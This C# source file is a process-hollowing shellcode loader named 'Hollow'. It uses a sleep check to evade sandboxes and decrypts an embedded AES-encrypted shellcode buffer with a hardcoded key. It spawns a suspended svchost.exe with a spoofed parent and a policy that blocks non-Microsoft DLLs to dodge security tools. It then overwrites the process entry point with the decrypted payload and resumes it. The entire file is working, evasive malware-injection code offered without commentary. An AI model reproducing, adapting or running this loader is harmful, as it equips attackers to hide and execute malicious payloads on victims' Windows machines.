using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.ComponentModel;
using System.IO;
using System.Security.Cryptography;
using System.Threading;

namespace Hollow
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)] public static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);
        [DllImport("kernel32.dll", SetLastError = true)] public static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, CreationFlags dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);
        [DllImport("kernel32.dll", SetLastError = true)] public static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)] public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)] private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);
        [DllImport("kernel32.dll", SetLastError = true)] static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
        [DllImport("kernel32.dll")] static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll", SetLastError = true)] private static extern uint ResumeThread(IntPtr hThread);
        [DllImport("kernel32.dll")] static extern void Sleep(uint dwMilliseconds);
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        public struct STARTUPINFO
        {
            public uint cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttributes;
            public uint dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdErr;
        }
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        [Flags]
        public enum ProcThreadAttribute : int
        {
            MITIGATION_POLICY = 0x20007,
            PARENT_PROCESS = 0x00020000
        }
        [Flags]
        public enum BinarySignaturePolicy : ulong
        {
            BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000,
            BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE = 0x300000000000
        }
        [Flags]
        public enum CreationFlags : uint
        {
            CreateSuspended = 0x00000004,
            DetachedProcess = 0x00000008,
            CreateNoWindow = 0x08000000,
            ExtendedStartupInfoPresent = 0x00080000
        }
        static void Main(string[] args)
        {
            DateTime t1 = DateTime.Now;
            Sleep(5000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 4.5)
            {
                return;
            }

            string MyKey = "20-5A-F5-ED-3F-C5-FE-9C-6F-CA-6A-CA-77-B6-F1-7B-71-E1-76-80-4A-89-0C-4E-80-A5-F4-B9-2B-08-E4-26";
            string Myiv = "AE-D7-C9-F4-21-47-26-B6-0F-6E-41-28-02-88-05-8D";
            byte[] buf = new byte[1536] { 0xb9, 0x1f, 0xdb, 0xcb, 0xcc, 0x94, 0x21, 0x04, 0x6c, 0x31, 0x7b, 0x05, 0xdd, 0x7b, 0x4d, 0x88, 0xab, 0xe5, 0x13, 0xe5, 0xd3, 0x6d, 0x54, 0xcf, 0x9e, 0x25, 0x70, 0x52, 0xae, 0x1c, 0x00, 0x4c, 0x16, 0xc3, 0xef, 0xec, 0x2f, 0xde, 0xd6, 0x11, 0xb8, 0xaf, 0x13, 0xa5, 0xa4, 0x38, 0x47, 0x1b, 0x95, 0xbf, 0x95, 0x56, 0x1d, 0x67, 0x74, 0xb3, 0x86, 0x4b, 0x43, 0x66, 0x1f, 0xbb, 0x8d, 0x6d, 0xf3, 0xe3, 0x3a, 0xc7, 0x17, 0x3e, 0x78, 0x56, 0x07, 0x86, 0x51, 0x16, 0x19, 0x51, 0xe5, 0x5f, 0x6a, 0xf5, 0x63, 0x7f, 0x8c, 0x1d, 0x49, 0xda, 0xdf, 0xc3, 0xc8, 0xec, 0x97, 0x9d, 0xef, 0x88, 0xef, 0xda, 0x3e, 0x65, 0x53, 0x11, 0x0b, 0x3e, 0x05, 0xc9, 0x69, 0xb5, 0x80, 0xf7, 0xcb, 0x2e, 0xf3, 0xd0, 0xa8, 0x65, 0x31, 0xcb, 0x4e, 0x1d, 0xe1, 0x0b, 0xb4, 0x60, 0xec, 0xd0, 0x49, 0xa2, 0x99, 0x13, 0xe4, 0x14, 0x27, 0x70, 0x2a, 0xc0, 0xdc, 0x87, 0x81, 0x22, 0x1f, 0x65, 0x6e, 0xd9, 0x6b, 0x70, 0x2f, 0xcf, 0x81, 0x29, 0x67, 0x5a, 0xf8, 0xb8, 0xcb, 0x91, 0xab, 0x04, 0x36, 0x45, 0xa9, 0x2f, 0x50, 0x92, 0x9a, 0xcf, 0xe1, 0x7c, 0xc8, 0x90, 0xf8, 0x65, 0xae, 0xb5, 0xe1, 0x3e, 0x1b, 0x88, 0xe2, 0xc9, 0x75, 0x62, 0x5e, 0x89, 0x33, 0xdb, 0xe9, 0x50, 0x38, 0x61, 0xe2, 0x31, 0x12, 0x07, 0xed, 0xd4, 0x42, 0xf9, 0xb4, 0x6d, 0xe7, 0xa5, 0xc4, 0x04, 0x31, 0x7b, 0x79, 0x4a, 0x5c, 0x24, 0x06, 0x99, 0x08, 0x23, 0xda, 0x19, 0x24, 0xe5, 0xea, 0xb2, 0x45, 0x43, 0xe5, 0x1b, 0xba, 0x53, 0x66, 0xf9, 0x59, 0x57, 0x8d, 0x42, 0xd7, 0xab, 0xf9, 0x9b, 0x61, 0xe6, 0x27, 0x46, 0x63, 0xb7, 0xcf, 0x88, 0x3b, 0xbf, 0x1d, 0xf8, 0x0e, 0x7b, 0x31, 0x71, 0xbf, 0xde, 0xf5, 0xa2, 0xc7, 0xf8, 0xb3, 0x68, 0x50, 0x83, 0x11, 0x91, 0x7b, 0xe4, 0x9e, 0x0f, 0x3e, 0xbb, 0x2d, 0x60, 0x8f, 0x84, 0x20, 0x5c, 0x62, 0x07, 0x68, 0x33, 0xd8, 0xe5, 0x86, 0xc3, 0xec, 0x79, 0xb2, 0x78, 0x13, 0x61, 0x0d, 0x73, 0xf7, 0x77, 0x55, 0x7e, 0xfd, 0x1b, 0xd0, 0x63, 0xb4, 0xda, 0x2b, 0x18, 0x9a, 0x55, 0x66, 0xb1, 0x47, 0x5d, 0x08, 0xf8, 0x9d, 0x98, 0x21, 0x51, 0x80, 0x52, 0x93, 0xb9, 0x80, 0xeb, 0x8a, 0x68, 0xdc, 0x58, 0x1e, 0x70, 0x7b, 0x82, 0xdd, 0x5e, 0x38, 0xea, 0x58, 0xc7, 0x2d, 0x3a, 0x20, 0x29, 0x8a, 0xc4, 0xe9, 0xe9, 0x1d, 0x1d, 0x5b, 0xef, 0x2f, 0x6a, 0x4b, 0x35, 0x86, 0x36, 0x88, 0x28, 0x09, 0x51, 0x38, 0xe5, 0x3b, 0xb9, 0x9f, 0x57, 0x14, 0xd8, 0xe2, 0x5d, 0x8f, 0x93, 0xb8, 0x02, 0x27, 0x74, 0x84, 0xb0, 0xfd, 0x5c, 0x90, 0x45, 0x0f, 0xdb, 0x2a, 0xd6, 0xca, 0xe5, 0x01, 0x49, 0x72, 0xa4, 0xbf, 0x03, 0xac, 0xe2, 0x04, 0xf6, 0x38, 0x9c, 0xb9, 0x9d, 0x6c, 0x80, 0x8e, 0x87, 0xbe, 0x30, 0x7e, 0x52, 0xcc, 0xaa, 0x84, 0x56, 0x51, 0xaf, 0x4e, 0x23, 0x8b, 0xa2, 0x73, 0xb5, 0x20, 0x6b, 0xf2, 0x93, 0xc1, 0x2e, 0x2a, 0xab, 0x42, 0x64, 0x75, 0x4b, 0xff, 0xb2, 0x77, 0xf2, 0x64, 0xe8, 0x0e, 0x37, 0xd1, 0x12, 0xf2, 0x9d, 0xf9, 0xf5, 0x0b, 0x36, 0x2f, 0x05, 0xa5, 0x46, 0xe2, 0x1f, 0x88, 0x2b, 0x02, 0xbc, 0x97, 0xa1, 0x6a, 0x8d, 0x84, 0x33, 0x2d, 0xcd, 0xa3, 0xcf, 0xaf, 0x60, 0x29, 0x71, 0xa7, 0x90, 0x4d, 0xa4, 0xaf, 0x1e, 0x65, 0xe6, 0x8a, 0x11, 0xdf, 0x49, 0xc9, 0xcc, 0xa2, 0x8b, 0x6e, 0x9f, 0xf1, 0x3e, 0x97, 0x9a, 0x04, 0x78, 0x77, 0x46, 0xf3, 0x6f, 0x9e, 0xdc, 0x6e, 0x47, 0x2f, 0x38, 0x28, 0x47, 0x14, 0xbc, 0xca, 0xc2, 0xb5, 0x40, 0xe8, 0xd6, 0xcc, 0x2e, 0xeb, 0xa3, 0x92, 0xf8, 0xa2, 0x21, 0xf1, 0xac, 0x6b, 0x6a, 0x73, 0x0a, 0x78, 0xde, 0x4e, 0xd7, 0x06, 0xca, 0x06, 0x2a, 0x2c, 0x6b, 0x5c, 0xeb, 0x57, 0xc9, 0x0c, 0x4e, 0x07, 0x63, 0x67, 0x6a, 0xdc, 0x88, 0x2b, 0x8c, 0x48, 0x2b, 0x8a, 0x7e, 0xc6, 0x27, 0x50, 0xda, 0x37, 0xce, 0xd3, 0xce, 0x2b, 0x05, 0xf6, 0xc2, 0xdc, 0x25, 0x97, 0x05, 0xe9, 0x40, 0x6d, 0x23, 0x36, 0x2b, 0xbd, 0xbf, 0x95, 0x19, 0xbe, 0xac, 0x08, 0x21, 0xf7, 0xeb, 0x4b, 0xf8, 0x67, 0x0f, 0x8f, 0x10, 0x60, 0xd3, 0x07, 0x21, 0xca, 0x9f, 0x8c, 0xb6, 0xd3, 0x0e, 0x7d, 0x98, 0x54, 0x10, 0xa2, 0x4c, 0x09, 0xf6, 0x74, 0xaf, 0x12, 0xbd, 0xf0, 0xd2, 0x3d, 0xb0, 0xd1, 0x35, 0x73, 0x6f, 0xca, 0x66, 0x18, 0x6a, 0x12, 0x9f, 0x21, 0x3c, 0x40, 0x72, 0x0d, 0xb9, 0xc4, 0x73, 0xd7, 0x79, 0x7a, 0xa9, 0xc9, 0xae, 0xe2, 0x6d, 0x12, 0x60, 0xe6, 0x5f, 0x79, 0xde, 0xc5, 0xca, 0x2c, 0xc7, 0xa5, 0x2d, 0xf0, 0x02, 0x55, 0x03, 0x59, 0x39, 0x24, 0x72, 0x98, 0xa0, 0x21, 0xc5, 0x55, 0x44, 0xd5, 0xd9, 0x0f, 0x7f, 0xa7, 0x1b, 0xc8, 0xfc, 0x26, 0x6e, 0xed, 0xd0, 0xbc, 0xb9, 0x56, 0x5e, 0xbe, 0x7a, 0xeb, 0x40, 0xdb, 0xd4, 0x76, 0x3f, 0xf2, 0x9b, 0x8a, 0x2d, 0x73, 0x04, 0x7a, 0xc9, 0x79, 0xae, 0x03, 0x02, 0x6d, 0x41, 0x5a, 0x66, 0x5a, 0x73, 0x88, 0xee, 0xbb, 0x66, 0x9b, 0xdd, 0xc8, 0xca, 0x76, 0x0b, 0x4f, 0x76, 0x67, 0x1c, 0x6c, 0x2c, 0x06, 0x84, 0x30, 0xb5, 0x20, 0xb5, 0x29, 0x92, 0x54, 0x44, 0xb1, 0x5c, 0x38, 0xdf, 0x36, 0x73, 0x33, 0xe9, 0x61, 0xb4, 0xeb, 0xbe, 0x18, 0xc9, 0x6f, 0x96, 0xd4, 0xf8, 0x7a, 0x5b, 0x73, 0x29, 0xfd, 0xc2, 0xec, 0x4e, 0xc0, 0x6c, 0x21, 0x2c, 0xf3, 0x3e, 0x2a, 0xc6, 0xf1, 0xf2, 0x03, 0x01, 0x8c, 0xed, 0x78, 0x55, 0xb3, 0xd5, 0x72, 0xa7, 0xc1, 0x06, 0xec, 0x0a, 0x24, 0x6f, 0x0b, 0xc1, 0xa9, 0x11, 0x99, 0x46, 0x1e, 0xde, 0xc5, 0x06, 0x28, 0xee, 0x2b, 0xdb, 0x22, 0x3c, 0xd7, 0xeb, 0x8e, 0x69, 0x7d, 0xfa, 0x8f, 0xee, 0x6c, 0x41, 0xad, 0x4a, 0xd1, 0x88, 0x36, 0x4a, 0xe6, 0xaf, 0x86, 0x19, 0xd9, 0xaa, 0x01, 0x0d, 0x41, 0xb5, 0x9a, 0xbc, 0x60, 0x12, 0x27, 0xb9, 0x45, 0x5d, 0x9b, 0xf4, 0x4a, 0x46, 0x02, 0xec, 0x4a, 0x11, 0x45, 0x91, 0xb1, 0x05, 0x99, 0xa8, 0xb9, 0x47, 0x0e, 0x7e, 0x4f, 0xba, 0x29, 0x92, 0xa7, 0x3f, 0xd5, 0x1f, 0x7a, 0xda, 0x68, 0x44, 0x1b, 0xf9, 0x96, 0xdc, 0x07, 0x0e, 0x7a, 0x01, 0x06, 0xee, 0x45, 0x0f, 0x5c, 0x42, 0x69, 0x72, 0x2e, 0x46, 0xa0, 0x69, 0xcf, 0x3c, 0x7f, 0x7e, 0x7b, 0xa9, 0x8f, 0x36, 0x18, 0x55, 0xad, 0xd7, 0x23, 0xf8, 0x50, 0x17, 0x08, 0x01, 0x91, 0xd5, 0x33, 0x4b, 0xe9, 0x89, 0xd2, 0x54, 0x19, 0x3b, 0xaa, 0x12, 0xb5, 0x24, 0x4a, 0x48, 0x0d, 0x39, 0xa5, 0xc2, 0xb8, 0xbf, 0xdb, 0x0c, 0xf0, 0xcc, 0x2c, 0x33, 0x61, 0x74, 0x9e, 0xb8, 0x17, 0x52, 0xa3, 0x92, 0x12, 0x40, 0x6c, 0xa5, 0x2f, 0xc5, 0xdb, 0x1d, 0xc1, 0x48, 0x66, 0x17, 0xb2, 0x99, 0xee, 0x8c, 0x90, 0xef, 0xb1, 0xc3, 0xe0, 0x3e, 0xa5, 0xda, 0x1f, 0x95, 0x4f, 0x7b, 0x8a, 0x34, 0xe2, 0x35, 0xad, 0x13, 0x14, 0x30, 0xac, 0x27, 0x63, 0x1d, 0xe6, 0x5e, 0xd5, 0x36, 0x3a, 0x14, 0x0b, 0x28, 0xe4, 0x58, 0xa9, 0x52, 0xb4, 0x13, 0x25, 0xba, 0xf3, 0x4b, 0x51, 0x68, 0xed, 0x5a, 0x58, 0xb4, 0xdb, 0x2d, 0x26, 0x30, 0xec, 0xc1, 0xf3, 0x23, 0x98, 0x28, 0x44, 0x89, 0x73, 0x36, 0x8a, 0xcd, 0xf9, 0xf4, 0xf4, 0x44, 0x0d, 0x0c, 0x88, 0x96, 0x3c, 0x16, 0x58, 0xc3, 0x4d, 0xd5, 0x52, 0x7b, 0x68, 0x74, 0x7f, 0x3e, 0x16, 0x5a, 0xd9, 0x75, 0xde, 0xee, 0x65, 0xa7, 0x5c, 0x39, 0xd3, 0x26, 0xd9, 0xf4, 0x04, 0x5b, 0x3f, 0x49, 0xea, 0x45, 0xd3, 0x74, 0xfc, 0x95, 0x50, 0x55, 0x1f, 0xd0, 0x16, 0x08, 0x65, 0x4d, 0x4f, 0x7b, 0x74, 0xd0, 0x66, 0xe9, 0xae, 0xa5, 0x32, 0x68, 0x52, 0x2f, 0xdd, 0x6a, 0xc7, 0xc0, 0x72, 0x6e, 0x4f, 0xed, 0x82, 0xa2, 0x0b, 0x8e, 0x28, 0x0e, 0xbc, 0x45, 0xb9, 0xd3, 0xa0, 0xbc, 0x84, 0xe8, 0xa6, 0x6d, 0xc3, 0x8d, 0xa5, 0x70, 0xa2, 0x4f, 0x09, 0x7c, 0x9d, 0x22, 0xfd, 0x84, 0x38, 0x75, 0xed, 0x8b, 0x89, 0x5e, 0xcf, 0x49, 0x49, 0x78, 0xe8, 0xf2, 0x2f, 0xb8, 0x2f, 0x12, 0x96, 0xe3, 0x8e, 0xc1, 0xc1, 0x66, 0x03, 0x19, 0xd0, 0x19, 0x55, 0x4e, 0x0c, 0xec, 0xca, 0xa8, 0x99, 0x33, 0xe6, 0xc9, 0x53, 0xe9, 0x80, 0x92, 0x3b, 0x69, 0x49, 0xd5, 0xd1, 0xd1, 0x5a, 0xbe, 0xcb, 0xf2, 0x73, 0xf6, 0xea, 0x53, 0xc5, 0x49, 0x7e, 0xfb, 0x83, 0xbb, 0x47, 0x2f, 0xea, 0x6f, 0x6a, 0x5c, 0x12, 0xc7, 0x25, 0xc4, 0x73, 0xe0, 0x4a, 0xb2, 0xc8, 0x0f, 0x6d, 0xdf, 0x8d, 0x91, 0xf2, 0xc1, 0xce, 0x84, 0x0e, 0xa6, 0xe4, 0x41, 0x87, 0xd2, 0x05, 0x3c, 0x52, 0x38, 0xd1, 0x2e, 0x8c, 0xc8, 0xe1, 0xd0, 0x9c, 0xf5, 0xd9, 0xf8, 0x80, 0x87, 0xda, 0x51, 0x9f, 0xc9, 0xbf, 0xa8, 0x5b, 0x7a, 0x0b, 0xaa, 0x21, 0x2b, 0x84, 0x06, 0x23, 0xd8, 0x99, 0xd3, 0x0b, 0xbc, 0xb8, 0x46, 0x48, 0x81, 0x8b, 0x44, 0x8a, 0xe7, 0x62, 0xc6, 0x97, 0x6f, 0x82, 0x6e, 0x72, 0x6d, 0xc7, 0xcb, 0xbd, 0x60, 0x04, 0x33, 0xed, 0xfc, 0xd0, 0x5b, 0x64, 0x84, 0x13, 0xc8, 0x5d, 0x4a, 0x4f, 0x41, 0x2f, 0xae, 0x94, 0x73, 0x82, 0x15, 0xa3, 0x8a, 0xd0, 0x2e, 0x9c, 0x52, 0xd2, 0x6e, 0x9f, 0x89, 0xb1, 0xfc, 0x7d, 0x86, 0x77, 0x97, 0x59, 0x22, 0xed, 0xe0, 0xdf, 0xfe, 0x18, 0x58, 0xf7, 0x37, 0x07, 0xf6, 0x3d, 0xe8, 0x9f, 0xbe, 0xb2, 0xc2, 0x8a, 0x6a, 0x38, 0x21, 0x1f, 0x75, 0x34, 0xb6, 0x9e, 0xc4, 0x8b, 0xca, 0x9c, 0x7f, 0xab, 0xbe, 0xad, 0x5b, 0x59, 0xa2, 0x7b, 0x72, 0x29, 0x16, 0xbd, 0x24, 0x3e, 0xf4, 0xce, 0xc6, 0xfd, 0x95, 0x57, 0x0b, 0x01, 0xd4, 0xfb, 0x60, 0xd4, 0xaa, 0x4a, 0x67, 0xe1, 0xd1, 0x9e, 0x7c, 0xb7, 0x98, 0xd8, 0x16, 0xe8, 0xd2, 0xdd, 0x08, 0xde, 0x69, 0xf5, 0x4c, 0x4c, 0x29, 0xc6, 0xd3, 0x8f, 0x7e, 0x21, 0xed, 0x12, 0xcd, 0xb2, 0x36, 0x9a, 0x7e, 0x9e, 0xbc, 0x59, 0x28, 0x96, 0x89, 0x44, 0x9e, 0x53, 0xa9, 0x84, 0x95, 0x3d, 0x2d, 0x4c, 0xe0, 0xdc, 0x6e, 0x79, 0x56, 0xdb, 0x80, 0x13, 0x95, 0x5c, 0x04, 0x94, 0x19, 0x58, 0x40, 0x8d, 0xbc, 0xbb, 0x0a, 0x99, 0x94, 0xfb, 0x91, 0xf7, 0x57, 0xd3, 0x60, 0xc6, 0xcc, 0x3a, 0xe6, 0x9e, 0x27, 0x04, 0x18, 0xf7, 0xa2, 0xce, 0x15, 0x8f, 0xe1, 0xa8, 0x2a, 0x7e, 0x74, 0xcf, 0xa8, 0x2e, 0x35, 0xf7, 0xd9, 0x54, 0x22, 0xd3, 0x12, 0x8a, 0xb2, 0x72, 0xf0, 0x98, 0x17, 0x73, 0xa0, 0x06, 0xe0, 0x82, 0xe7, 0x02, 0x5b, 0xc7, 0xde, 0xe9, 0x64, 0x72, 0x4e, 0x0f, 0x57, 0x69, 0x34, 0xef, 0x97, 0x21, 0x71, 0x50, 0x98, 0xba, 0xd3, 0x99, 0x4b, 0x6f, 0x45, 0x9b, 0xe5, 0xba, 0x94, 0x98, 0x52, 0x7e, 0x74, 0xe1, 0x98, 0x6f, 0x1e, 0x0f, 0x39, 0xa9, 0x68, 0x7b, 0x40, 0xaa, 0x44, 0x3f, 0x43, 0x88, 0x8d, 0xea, 0x95, 0xc6, 0x4b, 0x8d, 0xa4 };
            //Convert key to bytes
            string[] c1 = MyKey.Split('-');
            byte[] f = new byte[c1.Length];
            for (int i = 0; i < c1.Length; i++) f[i] = Convert.ToByte(c1[i], 16);
            //Convert IV to bytes
            string[] d1 = Myiv.Split('-');
            byte[] g = new byte[d1.Length];
            for (int i = 0; i < d1.Length; i++) g[i] = Convert.ToByte(d1[i], 16);

            string roundtrip = DecryptStringFromBytes_Aes(buf, f, g);
            // Remove dashes from string
            string[] roundnodash = roundtrip.Split('-');
            // Convert Decrypted shellcode back to bytes
            byte[] e = new byte[roundnodash.Length];
            for (int i = 0; i < roundnodash.Length; i++) e[i] = Convert.ToByte(roundnodash[i], 16);

            var startInfoEx = new STARTUPINFOEX();
            var pi = new PROCESS_INFORMATION();
            startInfoEx.StartupInfo.cb = (uint)Marshal.SizeOf(startInfoEx);
            Console.WriteLine(startInfoEx.StartupInfo.cb);
            var lpValue = Marshal.AllocHGlobal(IntPtr.Size);
            Console.WriteLine(lpValue);

            try
            {
                var processSecurity = new SECURITY_ATTRIBUTES();
                var threadSecurity = new SECURITY_ATTRIBUTES();
                processSecurity.nLength = Marshal.SizeOf(processSecurity);
                threadSecurity.nLength = Marshal.SizeOf(threadSecurity);

                var lpSize = IntPtr.Zero;
                InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);
                startInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                InitializeProcThreadAttributeList(startInfoEx.lpAttributeList, 2, 0, ref lpSize);
                Marshal.WriteIntPtr(lpValue, new IntPtr((long)BinarySignaturePolicy.BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE));

                UpdateProcThreadAttribute(
                    startInfoEx.lpAttributeList,
                    0,
                    (IntPtr)ProcThreadAttribute.MITIGATION_POLICY,
                    lpValue,
                    (IntPtr)IntPtr.Size,
                    IntPtr.Zero,
                    IntPtr.Zero
                    );

                var parentHandle = Process.GetProcessesByName("httpd")[0].Handle;
                Console.WriteLine(parentHandle);
                lpValue = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpValue, parentHandle);

                UpdateProcThreadAttribute(
                    startInfoEx.lpAttributeList,
                    0,
                    (IntPtr)ProcThreadAttribute.PARENT_PROCESS,
                    lpValue,
                    (IntPtr)IntPtr.Size,
                    IntPtr.Zero,
                    IntPtr.Zero
                    );
                CreateProcess(
                    null,
                    "C:\\Windows\\System32\\svchost.exe",
                    ref processSecurity,
                    ref threadSecurity,
                    false,
                    0x0008004,
                    IntPtr.Zero,
                    null,
                    ref startInfoEx,
                    out pi
                    );
                Console.WriteLine(pi.hThread);
            }
            catch (Exception error)
            {
                Console.Error.WriteLine("error" + error.StackTrace);
            }
            finally
            {
                DeleteProcThreadAttributeList(startInfoEx.lpAttributeList);
                Marshal.FreeHGlobal(startInfoEx.lpAttributeList);
                Marshal.FreeHGlobal(lpValue);
            }
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            Console.WriteLine(entrypoint_rva);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
            Console.WriteLine(addressOfEntryPoint);
            WriteProcessMemory(hProcess, addressOfEntryPoint, e, e.Length, out nRead);
            ResumeThread(pi.hThread);
        }
        static string DecryptStringFromBytes_Aes(byte[] cipherText, byte[] Key, byte[] IV)
        {
            // Check arguments.
            if (cipherText == null || cipherText.Length <= 0)
                throw new ArgumentNullException("cipherText");
            if (Key == null || Key.Length <= 0)
                throw new ArgumentNullException("Key");
            if (IV == null || IV.Length <= 0)
                throw new ArgumentNullException("IV");

            // Declare the string used to hold
            // the decrypted text.
            string plaintext = null;

            // Create an Aes object
            // with the specified key and IV.
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = Key;
                aesAlg.IV = IV;

                // Create a decryptor to perform the stream transform.
                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                // Create the streams used for decryption.
                using (MemoryStream msDecrypt = new MemoryStream(cipherText))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                        {

                            // Read the decrypted bytes from the decrypting stream
                            // and place them in a string.
                            plaintext = srDecrypt.ReadToEnd();
                        }
                    }
                }
            }
            return plaintext;
        }
    }
}